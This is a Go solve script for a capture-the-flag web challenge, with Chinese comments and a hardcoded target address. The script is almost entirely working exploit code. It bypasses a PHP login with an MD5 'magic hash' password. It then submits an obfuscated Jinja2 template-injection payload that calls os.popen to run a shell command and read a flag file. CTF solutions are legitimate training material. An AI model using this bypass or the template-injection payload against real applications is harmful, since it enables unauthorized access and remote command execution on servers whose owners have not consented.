// =============================================================================
// 题目名称: Admin Panel
// 题目类别: Web - SSTI (服务端模板注入)
// 解题思路: 利用 PHP 弱类型比较 (md5 magic hash 240610708) 绕过登录验证，
//
//	然后通过 Jinja2 SSTI 注入读取 /flag.txt
//
// 用法: go run NovruzCTF_Novruz_Secret_Keeper.go [目标地址]
//
//	示例: go run NovruzCTF_Novruz_Secret_Keeper.go http://103.54.19.209
//
// =============================================================================
package main

import (
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
)

const defaultTarget = "http://103.54.19.209"

func main() {
	base := defaultTarget
	if len(os.Args) > 1 {
		base = os.Args[1]
	}

	jar, err := cookiejar.New(nil)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] 创建 cookie jar 失败: %v\n", err)
		os.Exit(1)
	}
	client := &http.Client{Jar: jar}

	// 步骤1: 利用 md5 magic hash 绕过登录
	login := url.Values{}
	login.Set("login", "admin")
	login.Set("pwd", "240610708")
	resp, err := client.PostForm(base+"/", login)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] 登录请求失败: %v\n", err)
		os.Exit(1)
	}
	io.ReadAll(resp.Body)
	resp.Body.Close()

	// 步骤2: 通过 SSTI 注入读取 flag
	payload := `{{
((cycler|attr("_"*2 ~ "init" ~ "_"*2)|attr("_"*2 ~ "globals" ~ "_"*2))["os"]).popen("cat /flag.txt").read()
}}`
	form := url.Values{}
	form.Set("title", payload)

	resp, err = client.PostForm(base+"/dashboard.php", form)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] SSTI 注入请求失败: %v\n", err)
		os.Exit(1)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	re := regexp.MustCompile(`novruzctf\{[^}]+\}`)
	m := re.Find(body)
	if m == nil {
		fmt.Fprintln(os.Stderr, "[!] 未找到 flag，响应内容:")
		fmt.Println(string(body))
		os.Exit(1)
	}
	fmt.Println(string(m))
}
